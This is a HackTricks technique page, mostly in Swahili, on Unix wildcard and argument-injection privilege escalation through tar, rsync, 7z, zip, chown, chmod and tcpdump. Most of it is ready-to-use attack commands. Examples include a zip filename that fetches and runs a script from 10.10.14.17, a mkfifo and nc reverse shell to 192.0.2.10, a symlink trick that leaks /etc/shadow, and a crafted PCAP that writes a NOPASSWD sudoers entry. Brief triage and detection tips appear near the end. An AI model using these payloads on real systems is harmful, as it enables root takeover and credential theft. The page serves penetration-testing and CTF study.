# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> **argument injection** ya Wildcard (pia huitwa *glob*) hutokea wakati script yenye privileged inaendesha Unix binary kama vile `tar`, `chown`, `rsync`, `zip`, `7z`, … ikiwa na wildcard isiyo na nukuu kama `*`.
> Kwa kuwa shell hupanua wildcard **kabla** ya kuendesha binary, attacker anayeweza kuunda files katika working directory anaweza kutengeneza filenames zinazoanza na `-`, ili zitafsiriwe kama **options badala ya data**, na hivyo kusafirisha kwa siri flags za kiholela au hata commands.
> Ukurasa huu unakusanya primitives muhimu zaidi, utafiti wa hivi karibuni na detections za kisasa za 2023-2025.

## chown / chmod

Unaweza **kunakili owner/group au permission bits za file lolote** kwa kutumia vibaya flag ya `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wakati root baadaye anatekeleza kitu kama:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` imeingizwa, na kusababisha *faili zote* zinazolingana kurithi umiliki/ruhusa za `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
Tazama pia karatasi ya classic ya DefenseCode kwa maelezo zaidi.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Tekeleza amri kiholela kwa kutumia vibaya kipengele cha **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Mara root anapoendesha, kwa mfano, `tar -czf /root/backup.tgz *`, `shell.sh` hutekelezwa kama root.

### bsdtar / macOS 14+

`tar` ya default kwenye macOS za hivi karibuni (inayotegemea `libarchive`) *haitekelezi* `--checkpoint`, lakini bado unaweza kupata code-execution kwa kutumia flag ya **--use-compress-program**, inayokuruhusu kubainisha compressor ya nje.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wakati script yenye privileged inaendesha `tar -cf backup.tar *`, `/bin/sh` itaanzishwa.

---

## rsync

`rsync` hukuruhusu kubadilisha remote shell au hata remote binary kupitia command-line flags zinazoanza na `-e` au `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ikiwa root baadaye ata-archive directory kwa `rsync -az * backup:/srv/`, flag iliyoingizwa itazindua shell yako upande wa remote.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (mode ya `rsync`).

---

## 7-Zip / 7z / 7za

Hata wakati script yenye privileged *kwa kujilinda* inaweka wildcard mbele ya `--` (ili kuzuia option parsing), format ya 7-Zip inasaidia **file list files** kwa kuweka `@` kabla ya filename. Kuunganisha hilo na symlink hukuwezesha kufanya *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ikiwa root itaendesha kitu kama:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip itajaribu kusoma `root.txt` (→ `/etc/shadow`) kama file list na itaacha kazi, **ikichapisha yaliyomo kwenye stderr**.

Hii bado inafanya kazi licha ya `-- *` kwa sababu 7-Zip CLI inakubali kwa uwazi majina ya kawaida ya files na `@listfiles` kama inputs za positional, hivyo jina halisi la file kama `@root.txt` bado hushughulikiwa kwa namna maalum.

---

## zip

Kuna primitives mbili za vitendo sana wakati application inapopitisha filenames zinazodhibitiwa na mtumiaji kwa `zip` (ama kupitia wildcard au kwa kuorodhesha majina bila `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` huwezesha “test archive” na `-TT <cmd>` hubadilisha tester kwa program yoyote (long form: `--unzip-command <cmd>`). Ikiwa unaweza kuingiza filenames zinazoanza na `-`, gawanya flags katika filenames tofauti ili short-options parsing ifanye kazi:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Vidokezo
- USIJARIBU filename moja kama `'-T -TT <cmd>'` — short options huchanganuliwa kwa kila character na itashindikana. Tumia tokens tofauti kama ilivyoonyeshwa.
- Ikiwa slashes zitaondolewa kwenye filenames na app, fetch kutoka bare host/IP (default path `/index.html`) na uhifadhi locally kwa `-O`, kisha execute.
- Unaweza ku-debug parsing kwa `-sc` (show processed argv) au `-h2` (more help) ili kuelewa jinsi tokens zako zinavyotumiwa.

Mfano (local behavior kwenye zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Ikiwa web layer inaonyesha `zip` stdout/stderr (jambo la kawaida kwenye wrappers rahisi), flags zilizoingizwa kama `--help` au errors kutokana na options zisizo sahihi zitaonekana kwenye HTTP response, hivyo kuthibitisha command-line injection na kusaidia kurekebisha payload.

---

## Binaries za ziada zilizo vulnerable kwa wildcard injection (orodha fupi ya 2023-2025)

Commands zifuatazo zimetumiwa vibaya katika CTFs za kisasa na environments halisi. Payload huundwa kila mara kama *filename* ndani ya writable directory ambayo baadaye itachakatwa kwa wildcard:

| Binary | Flag ya kutumia vibaya | Athari |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Soma file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution kupitia git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program badala ya ssh |

Primitives hizi hazitokei mara nyingi kama classics za *tar/rsync/zip*, lakini zinafaa kuchunguzwa wakati wa hunting.

---

## Kutafuta wrappers na jobs zilizo vulnerable

Case studies za hivi karibuni zimeonyesha kuwa wildcard/argv injection si tatizo la **cron + tar** pekee.<sup>[[5]](#references)</sup> Aina hii hii ya bug inaendelea kujitokeza kwenye:

- web features ambazo "download everything as zip/tar" kutoka attacker-controlled upload directories
- vendor/appliance debug shells zinazofichua **tcpdump** wrapper yenye attacker-controlled filename/filter fields
- backup au rotation jobs zinazoendesha `tar`, `rsync`, `7z`, `zip`, `chown`, au `chmod` kwenye writable directories

Amri muhimu za triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Mbinu za haraka:

- `-- *` ni fix nzuri kwa GNU tools nyingi, lakini **si** kwa `7z`/`7za` kwa sababu `@listfiles` huchanganuliwa kando.
- Kwa `zip`, tafuta wrappers zinazoorodhesha user-controlled filenames moja kwa moja; short-option splitting (`-T` + `-TT <cmd>`) bado hufanya kazi hata bila shell glob.
- Kwa `tcpdump`, zingatia hasa wrappers zinazokuruhusu kudhibiti **output file names**, **rotation settings**, au arguments za **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE kupitia argv injection katika wrappers

Restricted shell au vendor wrapper inapounda command line ya `tcpdump` kwa kuunganisha fields zinazodhibitiwa na user (kwa mfano, parameter ya "file name") bila strict quoting/validation, unaweza kuingiza `tcpdump` flags za ziada kisiri. Mchanganyiko wa `-G` (time-based rotation), `-W` (limit number of files), na `-z <cmd>` (post-rotate command) huwezesha arbitrary command execution kwa user anayeendesha tcpdump (mara nyingi root kwenye appliances).<sup>[[1]](#references)[[4]](#references)</sup>

Masharti ya awali:

- Unaweza kuathiri `argv` inayopitishwa kwa `tcpdump` (kwa mfano, kupitia wrapper kama `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper haisafishi spaces au tokens zinazoanza na `-` katika field ya file name.

Classic PoC (huendesha reverse shell script kutoka writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Maelezo:

- `-G 1 -W 1` hulazimisha rotate ya papo hapo baada ya packet ya kwanza inayolingana.
- `-z <cmd>` huendesha post-rotate command mara moja kwa kila rotation. Builds nyingi huendesha `<cmd> <savefile>`. Ikiwa `<cmd>` ni script/interpreter, hakikisha ushughulikiaji wa argument unaendana na payload yako.

Lahaja zisizotumia removable media:

- Ikiwa una primitive nyingine yoyote ya kuandika files (kwa mfano, command wrapper tofauti inayoruhusu output redirection), weka script yako kwenye path inayojulikana na u-trigger `-z /bin/sh /path/script.sh` au `-z /path/script.sh` kulingana na platform semantics.
- Baadhi ya vendor wrappers huzungusha files kwenda maeneo yanayodhibitiwa na attacker. Ikiwa unaweza kuathiri path inayozungushwa (symlink/directory traversal), unaweza kuelekeza `-z` ili itekeleze content unayoidhibiti kikamilifu bila external media.

---

## sudoers: tcpdump yenye wildcards/additional args → arbitrary write/read na root

Anti-pattern ya kawaida sana ya sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Matatizo
- Glob ya `*` na patterns zinazoruhusu matumizi mapana huweka vikwazo kwenye argument ya kwanza ya `-w` pekee. `tcpdump` inakubali options nyingi za `-w`; ya mwisho ndiyo hutumika.
- Rule haiwekei vikwazo options nyingine, kwa hivyo `-Z`, `-r`, `-V`, n.k. zinaruhusiwa.

Mbinu za msingi
- Override destination path kwa `-w` ya pili (ya kwanza hutimiza tu masharti ya sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal ndani ya `-w` ya kwanza ili kutoroka kwenye mti uliowekewa mipaka:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Lazimisha umiliki wa output kwa kutumia `-Z root` (huunda faili zinazomilikiwa na root mahali popote):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Kuandika maudhui ya kiholela kwa kucheza tena PCAP iliyotengenezwa kupitia `-r` (kwa mfano, kuweka mstari wa sudoers):

<details>
<summary>Tengeneza PCAP iliyo na payload ya ASCII iliyo sahihi na uiandike kama root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Usomaji wa faili kiholela/secret leak kwa kutumia `-V <file>` (hutafsiri orodha ya savefiles). Uchunguzi wa makosa mara nyingi hurudia mistari, hivyo kuvuja kwa maudhui:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Marejeo

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
